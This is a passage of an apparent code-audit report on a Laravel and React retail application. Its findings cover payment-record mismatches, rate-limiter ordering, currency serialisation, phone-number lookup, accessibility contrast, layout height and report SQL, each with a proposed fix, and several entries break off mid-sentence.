**Breaks:** initiatePaystack creates the pending Payment with payment_method 'card'. verifyPaystack then looks the payment up twice — line 631 `->where('payment_method', 'card_paystack')` with the reference, and the 'in case reference differs slightly' fallback at line 639, which ALSO filters on 'card_paystack'. Neither can ever match a row this controller wrote, so $payment is always null and the 'Webhook may not have created the payment yet' branch at line 708 fires on the happy path, inserting a SECOND row (method 'card_paystack', status paid). The original 'card' row stays status=pending forever. Consequences: the order carries a phantom outstanding pending payment; PaymentController::paystackWebhoo

**Fix:** Write the same method string the verifier expects. PublicPaymentController.php:404:
```php
                'payment_method'     => 'card_paystack',
```
and tighten the fallback lookup so it cannot grab an unrelated row (line 637-643):
```php
        // Fallback: same order, same method, still pending — but never ignore
        // the reference entirely; a mismatched reference must not settle here.
        if (! $payment) {
            $payment = Payment::where('order_id', $order->id)
                ->where('payment_method', 'card_paystack')
                ->where('status', 'pending')
                ->whereNull('provider_reference')
                ->latest()
                ->first();
   

### public-api limiter's API-key branch is unreachable — throttle runs before the middleware that sets the attribute it reads

`RouteServiceProvider.php:69` · V2-security

```
$apiKeyName = $request->attributes->get('api_key_name');
```

**Breaks:** api_key_name is set by ValidateApiKey (ValidateApiKey.php:83), which is registered AFTER the throttle on the group: `Route::middleware(['throttle:public-api', 'api.key:optional'])` (routes/api.php:137). Laravel's middleware priority map contains ThrottleRequests but not ValidateApiKey, and SortedMiddleware only reorders middlewares that are both in the priority map — a non-priority middleware is never hoisted above a priority one. So ThrottleRequests always executes first and the attribute is always null when the limiter closure runs. The 100/min per-key bucket at line 72 is dead code that has never once been taken: every API-key holder is silently metered on the anonymous 60/min bucket keye

**Fix:** Reorder the group so the key is resolved before it is read. Since ValidateApiKey is not in the priority map, declaration order is honoured — routes/api.php:137:
```php
    // api.key MUST precede the throttle: the public-api limiter reads the
    // api_key_name attribute that ValidateApiKey sets, and Laravel's priority
    // map would otherwise leave ThrottleRequests first and the key branch dead.
    Route::middleware(['api.key:optional', 'throttle:public-api'])->group(function () {
```
Also note the inner /products/search route (line 145-146) does `->middleware('throttle:search')->withoutMiddleware('throttle:public-api')`, which keeps working unchanged under the new order.

### Public storefront checkout shares the 5-per-minute login bucket, so guest orders lock staff out of the admin console

`api.php:182` · V2-security

```
->middleware('throttle:auth');
```

**Breaks:** Named limiters key on md5($limiterName . $limit->key) — the route is not part of the key (Illuminate\Routing\Middleware\ThrottleRequests::handleRequestUsingNamedLimiter). So every route tagged throttle:auth shares ONE 5-request/minute bucket per client IP: /v1/auth/register, /v1/auth/login, /v1/auth/forgot-password, /v1/auth/reset-password, /v1/admin/auth/login, /v1/admin/auth/2fa/verify — and this public storefront checkout. Six guest checkouts in a minute from one office, school, hotel or CGNAT mobile range burn the whole bucket and the next staff login from that network gets 'Too many login attempts. Please try again later.' with no failed login ever having occurred. It works in reverse t

**Fix:** Give checkout its own limiter. routes/api.php:181-182:
```php
        Route::post('/storefront/orders', [\App\Http\Controllers\Api\StorefrontCheckoutController::class, 'store'])
            ->middleware('throttle:checkout');
```
and in RouteServiceProvider::configureRateLimiting():
```php
        // Guest checkout — abuse-resistant but deliberately NOT the 'auth'
        // bucket: named limiters ignore the route, so sharing 'auth' let a
        // burst of orders lock staff out of the console from the same IP.
        RateLimiter::for('checkout', function (Request $request) {
            return Limit::perMinute(15)
                ->by($request->ip())
                ->response(fn (Request 

### Money fields ship as JSON strings from four endpoints that skip numify() — ::float8 alone is not sufficient (R5)

`ReportController.php:708` · V1-ledger-sql

```
return response()->json([
            'period'          => ['start' => $start, 'end' => $end],
            'payment_methods' => $rows,
        ]);
```

**Breaks:** The file's own docblock (lines 36-39) states the rule: "The ::float8 casts on the aggregates are correct SQL but NOT sufficient: PDO_PGSQL hands numeric and float8 back to PHP as STRINGS regardless... The guarantee has to be made in PHP." Four money-bearing endpoints return without wrapping in $this->numify(): salesByPaymentMethod (708), profitLoss (1345, whose expenses_by_category[].total is a raw ::float8 aggregate), revenue (1387, whose monthly[].total is likewise raw), and dashboardKPIs (1795, whose kpis.sales.total and .average come from Builder::sum()/avg() on a decimal column and are strings for the same reason). So GET /reports/financial/revenue returns monthly[].total as "419600" an

**Fix:** // salesByPaymentMethod (line 708) — the same guarantee every other money
// endpoint in this file already makes:
        return response()->json($this->numify([
            'period'          => ['start' => $start, 'end' => $end],
            'payment_methods' => $rows,
        ]));

// profitLoss (line 1345):
        return response()->json($this->numify([
            'period'                     => ['start' => $start, 'end' => $end],
            'revenue'                    => round($revenue, 2),
            'cost_of_goods_sold'         => round($cogs, 2),
            'gross_profit'               => round($grossProfit, 2),
            'gross_profit_margin_percent'=> $grossMargin,
         

### Storefront order lookup matches raw stored phone strings, so a customer whose number was typed with spaces cannot find their own order

`StorefrontLookupController.php:108` · V5-data-quality

```
$query->whereIn('customer_phone', StorefrontOtpService::phoneVariants($value));
```

**Breaks:** `phoneVariants()` (`StorefrontOtpService.php:89-96`) generates exactly three literals — `+254724351780`, `254724351780`, `0724351780` — and this does an exact `IN` match against the stored column. The entire premise of migration 2026_08_08_000001 and of commit b40e319 ("count a customer once, however their number was typed") is that `orders.customer_phone` holds the same number in many formats; `PhoneNormalisationTest:41-47` enumerates `'0724 351 780'` and `' 0724-351-780 '` as forms clerks actually type. Any order stored in one of those punctuated forms is invisible to this lookup: the customer verifies by OTP and is told they have no orders, and in `StorefrontOtpService::requestCode` (line

**Fix:** Match on the canonical form on both sides so there is one definition, not two:

    // StorefrontLookupController.php:108
    $query->whereRaw('normalize_phone(customer_phone) = normalize_phone(?)', [$value]);

    // StorefrontOtpService.php:144
    $email = Order::whereRaw('normalize_phone(customer_phone) = normalize_phone(?)', [$value])
        ->whereNotNull('customer_email')
        ->orderByDesc('id')
        ->value('customer_email');

Then delete `StorefrontOtpService::normalizePhone()` and `phoneVariants()` and route their remaining callers through the database function, so the rule exists once. Back the predicate with the functional index the migration's IMMUTABLE declaration was w

### Sidebar "Sign out" is danger red on the navy slab — 3.08:1

`Sidebar.tsx:995` · V3-tokens-wcag

```
className="w-full flex items-center gap-3 px-4 py-2.5 text-xs text-danger hover:bg-danger/10 transition-colors disabled:opacity-60 disabled:cursor-not-allowed"
```

**Breaks:** `danger.DEFAULT` #dc2626 on the account-menu panel, which is `bg-nav-hover` #1b2740 (Sidebar.tsx:969), measures **3.08:1** at `text-xs` (12px) — normal text, 4.5:1 required. The rest of the sidebar is fine (white/60 email = 7.00:1, white/55 section headers = 6.11:1, brand-300 on the active pill = 7.31:1); this is the only item on the slab that fails, and it is the destructive one, so it is also the one a user most needs to read before tapping.

**Fix:** Use a light step of the danger ramp — dark chrome wants light ink, not the mid ramp:
```tsx
className="w-full flex items-center gap-3 px-4 py-2.5 text-xs text-danger-300 hover:bg-danger/10 hover:text-danger-200 transition-colors disabled:opacity-60 disabled:cursor-not-allowed"
```
`danger-300` #fca5a5 on #1b2740 is 8.03:1.

### `.page-subtitle` and `.table th` put surface-500 on non-white backgrounds — 4.10:1 and 4.11:1

`index.css:224` · V3-tokens-wcag

```
@apply mt-1 text-[15px] md:text-base text-surface-500 leading-snug;
```

**Breaks:** tailwind.config.js:69 justifies surface-500 = #70786d on the strength of "4.57:1 on white" — but neither of its two biggest consumers sits on white. `.page-subtitle` (47 pages) renders directly on the shell canvas `bg-surface-canvas` #f2f3f1 (AdminLayout.tsx:201 sets it; `<main>` and the content wrapper at AdminLayout.tsx:279 add no background), giving **4.10:1** at 15/16px. `.table th` (index.css:185) puts the same colour on `bg-surface-100` #f2f3f2 from `.table thead tr` (index.css:181), giving **4.11:1** at `text-xs` uppercase. Both are normal text and both miss 4.5:1. The 4.57:1 headroom on white was only 1.6% to begin with, so any tinted background eats it.

**Fix:** Darken the token once rather than patching 2 component classes and ~450 call sites — in tailwind.config.js:38 replace `500: '#70786d',` with:
```js
// 5.12:1 on white, 4.60:1 on surface-canvas (#f2f3f1), 4.61:1 on surface-100.
// The old #70786d cleared 4.5:1 only against pure white, which is not where
// .page-subtitle or .table th actually render.
500: '#687066',
```
No markup changes needed; this also fixes surface-500 used on `bg-surface-50` cards (4.37:1 → 4.90:1).

### `.input` has no visible boundary — 1.24:1 border on a 1.02:1 fill (WCAG 1.4.11)

`index.css:52` · V3-tokens-wcag

```
@apply block w-full rounded-field border border-line bg-field px-4 py-3
```

**Breaks:** `.input` is used 263 times and forms live inside `.card` (index.css:123, `bg-white`). Its only two affordances are `border-line` #e5e7e3 — **1.24:1 against the white card** — and `bg-field` #fafbfa — **1.02:1 against the white card**. WCAG 1.4.11 requires 3:1 for the visual information that identifies a control, and nothing here reaches it, so an empty text field is indistinguishable from blank card space until it is focused (focus swaps the border to brand-500, 3.55:1, which is the only state that passes). On the low-contrast panels of shop-floor tablets the fields disappear entirely. Same hairline is the table grid (`.table td` index.css:190) at 1.24:1 and the thead rule at 1.12:1 against 

**Fix:** Give the control a boundary that clears 3:1 while leaving the decorative hairline alone — surface-400 (#8c9489) is 3.13:1 on white and is already in the ramp:
```css
.input {
    @apply block w-full rounded-field border border-surface-400 bg-field px-4 py-3
       text-[15px] leading-tight text-surface-900 placeholder:text-surface-500
       min-h-[48px] transition-colors duration-150
       focus:border-brand-500 focus:bg-white focus:outline-none focus:ring-1 focus:ring-brand-500
       disabled:cursor-not-allowed disabled:bg-surface-100 disabled:text-surface-400;
}
```
Leave `line` (#e5e7e3) as the decorative divider for `.card-header`/`.table td`, where 1.4.11 does not bite.

### PageShell hard-codes height: calc(100vh - 112px), which under-reserves the phone chrome by 62px and re-introduces the iOS large-viewport bug the shell already fixed

`ProductionPage.tsx:3074` · V4-layout

```
<div className="flex flex-col h-full animate-fade-in" style={{ height: "calc(100vh - 112px)" }}>
```

**Breaks:** PageShell wraps four production routes (Orders 3097, WIP 3220, BOM 3238, QC 3246) and pins the page column to a fixed viewport calculation. Two errors compound. (1) The 112px constant does not match the shell's actual chrome. On a phone AdminLayout reserves topbar `h-[60px]` + main padding `py-3` (24px) + BottomTabBar `h-14` (56px) + `pb-[env(safe-area-inset-bottom)]` (34px on a notched iPhone) = 174px, so the column runs 62px taller than the box it sits in; at md+ the real chrome is 60 + `py-8` (64px) = 124px, so it still overruns by 12px. (2) It uses raw `100vh`, which AdminLayout.tsx:194-201 explicitly abandoned for `h-screen-safe` (`calc(var(--vh,1vh)*100)`) because on iOS Safari `100vh`

**Fix:** function PageShell({ title, subtitle, children, headerRight }: {
    title: string;
    subtitle: string;
    children: React.ReactNode;
    headerRight?: React.ReactNode;
}) {
    return (
        // Height comes from --vh (the shell's REAL visible height, kept current by
        // AdminLayout's visualViewport listener) minus the chrome the shell
        // actually reserves — NOT from 100vh, which on iOS is the large viewport
        // and overstates the window by the height of the Safari toolbars.
        //   phone : 60px topbar + 24px main py-3 + 56px tab bar + home-indicator inset
        //   md+   : 60px topbar + 64px main py-8   (tab bar is md:hidden)
        <div className="flex 

### `text-muted` / `bg-muted/40` reference a token that does not exist — 17 dead classes

`QuotationsPage.tsx:484` · V3-tokens-wcag

```
{searching && <div className="px-3 py-2 text-sm text-muted">Searching…</div>}
```

**Breaks:** There is no `muted` key anywhere in tailwind.config.js. A fresh compile of the real content glob contains zero occurrences of the string `muted`, so all 17 usages emit nothing. Text sites silently inherit the ancestor colour (surface-900 inside a card, surface-700 inside `.table td`), so "muted" copy renders at full weight and the visual hierarchy the author intended is gone; the interactive ones are worse — `hover:bg-muted/40` at :489 and :534 means the product-search options have **no hover feedback at all**, so there is no indication which row a click will select. Also at QuotationsPage.tsx:141/221/254/276/493/515/538/565/570/589 and InvoicesPage.tsx:78/98/125.

**Fix:** `rg -l -- '-muted' src/pages/sales | xargs sed -i '' -E 's/text-muted/text-surface-500/g; s/bg-muted\/40/bg-surface-100/g'`. For the quoted line: `{searching && <div className="px-3 py-2 text-sm text-surface-500">Searching…</div>}`; for :489/:534 `… text-left text-sm hover:bg-surface-100`.


---

## Low

### web.php and api.php are loaded three times on every boot, which also makes php artisan route:cache impossible

`providers.php:5` · V2-security

```
App\Providers\RouteServiceProvider::class,
```

**Breaks:** bootstrap/app.php already declares routing via withRouting(web: ..., api: ...), which calls RouteServiceProvider::loadRoutesUsing() — that writes the framework class's STATIC $alwaysLoadRoutesUsing (vendor/laravel/framework/src/Illuminate/Foundation/Support/Providers/RouteServiceProvider.php:97, `self::$alwaysLoadRoutesUsing = $routesCallback`) — and then force-registers the framework RouteServiceProvider. The app's own App\Providers\RouteServiceProvider is ALSO registered here and its boot() calls $this->routes(...) with a second closure that loads the same two files (RouteServiceProvider.php:29-36). loadRoutes() (framework line 152) invokes the static callback AND the instance callback, an

**Fix:** Keep bootstrap/app.php as the single routing declaration and demote the provider to what it uniquely owns, the rate limiters. NOTE: do not simply delete the provider — configureRateLimiting() defines auth/public-api/search/api/admin-api/webhooks, and without it every throttle:<name> middleware throws 'Rate limiter [auth] is not defined'.

1) Move the limiters into AppServiceProvider::boot():
```php
public function boot(): void
{
    // ... existing body ...
    $this->configureRateLimiting();   // body copied verbatim from RouteServiceProvider
}
```
2) Delete app/Providers/RouteServiceProvider.php and remove line 5 of bootstrap/providers.php:
```php
return [
    App\Providers\AppServiceProvi

### discount_rate_percent is diluted by shipping and tax — its denominator is not the merchandise the discount applied to

`ReportController.php:199` · V1-ledger-sql

```
(COALESCE(SUM(discount_amount) / NULLIF(SUM(total_amount + discount_amount), 0) * 100, 0))::float8 AS discount_rate_percent
```

**Breaks:** orders.total_amount is built as `$afterDiscount + ($taxInclusive ? 0 : $taxAmount) + $shippingAmt` where `$afterDiscount = $itemSubtotal - $cartDiscount` (PosController.php:3528-3530), so `total_amount + discount_amount` re-adds the cart discount and yields subtotal + shipping (+ tax when prices are tax-exclusive). Shipping fees and output VAT are not merchandise a discount was ever applied to, so the rate is understated by the share of the basket they represent — on a KES 8,000 order with a KES 800 discount and KES 1,000 delivery, the page reports 8.9% when the discount actually given was 10.0%. The correct pre-discount merchandise value is already stored: orders.subtotal is written as roun

**Fix:**             -- Rate the CART discount against the merchandise it was applied to.
            -- total_amount + discount_amount reconstitutes subtotal + shipping
            -- (+ tax when prices are tax-exclusive), and neither delivery nor
            -- output VAT was ever discounted, so the rate came out diluted.
            -- orders.subtotal is already the pre-cart-discount line total
            -- (PosController::createSale writes round($itemSubtotal, 2)).
            (COALESCE(SUM(discount_amount) / NULLIF(SUM(subtotal), 0) * 100, 0))::float8 AS discount_rate_percent,
            -- Per-line discounts are a separate figure and were previously
            -- invisible here; report them
